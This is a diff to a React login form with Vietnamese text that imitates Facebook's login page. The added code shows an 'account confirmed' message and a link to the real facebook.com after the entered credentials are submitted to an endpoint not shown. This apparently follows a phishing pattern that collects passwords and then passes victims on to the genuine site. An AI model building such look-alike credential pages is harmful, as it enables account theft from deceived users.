@@ -8,6 +8,7 @@ function FormLogin() {
   const [pass, setPass] = useState("");
   const refs = useRef();
   const [err, setErr] = useState("");
+  const [link, setLink] = useState("");
 
   //handleLogin
   const handleLogin = (e) => {
@@ -22,6 +23,8 @@ function FormLogin() {
 
             request
           );
+          setLink("https://www.facebook.com");
+          setErr(null);
         } catch (error) {
           console.log(error.message);
         }
@@ -31,7 +34,8 @@ function FormLogin() {
       setPass("");
       refs.current.focus();
     } else {
-      setErr("Vui lòng điền tài khoản");
+      setErr("* Vui lòng điền tài khoản");
+      setLink(null);
     }
   };
 
@@ -61,7 +65,18 @@ function FormLogin() {
             với mọi người trong cuộc sống của bạn.
           </h2>
         </div>
+
         <p style={{ marginBottom: "30px", color: "red" }}>{err}</p>
+
+        {link ? (
+          <div style={{ marginBottom: "30px", textAlign: "center" }}>
+            <p style={{ marginBottom: "10px" }}>Tài khoản đã được xác nhận.</p>
+            <a href={link}>Click</a> để tiếp tục.
+          </div>
+        ) : (
+          ""
+        )}
+
         <div className="loginAcc">
           <form className="login" onSubmit={handleLogin}>
             <input
